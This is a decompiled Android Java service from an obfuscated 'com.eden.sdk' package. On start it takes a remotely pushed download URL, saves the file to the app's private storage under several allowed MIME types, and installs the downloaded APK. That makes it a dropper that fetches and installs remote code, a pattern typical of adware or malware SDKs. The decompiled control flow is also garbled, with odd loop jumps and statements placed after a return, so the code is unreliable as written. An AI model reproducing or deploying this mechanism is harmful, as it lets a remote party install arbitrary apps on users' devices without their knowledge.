package com.eden.sdk.service;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.text.TextUtils;
import com.eden.sdk.a;
import com.eden.sdk.manager.b;
import com.eden.sdk.response.PushApk;
import com.eden.sdk.util.AppUtils;
import java.io.File;

public class A
  extends Service
{
  public A() {}
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    if (paramIntent != null) {}
    for (;;)
    {
      try
      {
        localObject1 = (PushApk)paramIntent.getSerializableExtra(a.b);
        if (localObject1 != null)
        {
          localObject1 = ((PushApk)localObject1).getDownloadUrl();
          if (!TextUtils.isEmpty((CharSequence)localObject1))
          {
            str2 = ((String)localObject1).substring(((String)localObject1).lastIndexOf("/") + 1);
            if (!TextUtils.isEmpty(str2))
            {
              str1 = getFilesDir() + File.separator + str2;
              localObject2 = new File(str1);
              if (!((File)localObject2).exists()) {
                continue;
              }
              AppUtils.installAPK((File)localObject2, this);
            }
          }
        }
      }
      catch (Exception localException)
      {
        Object localObject1;
        String str2;
        String str1;
        Object localObject2;
        continue;
      }
      return super.onStartCommand(paramIntent, paramInt1, paramInt2);
      str2 = str2 + "_temp";
      localObject2 = str1 + "_temp";
      b.a(this, (String)localObject1, new g(this, new String[] { "application/vnd.android.package-archive", "application/octet-stream", "image/jpeg", "image/png", "image/gif" }, str2, str1, (String)localObject2));
    }
  }
}
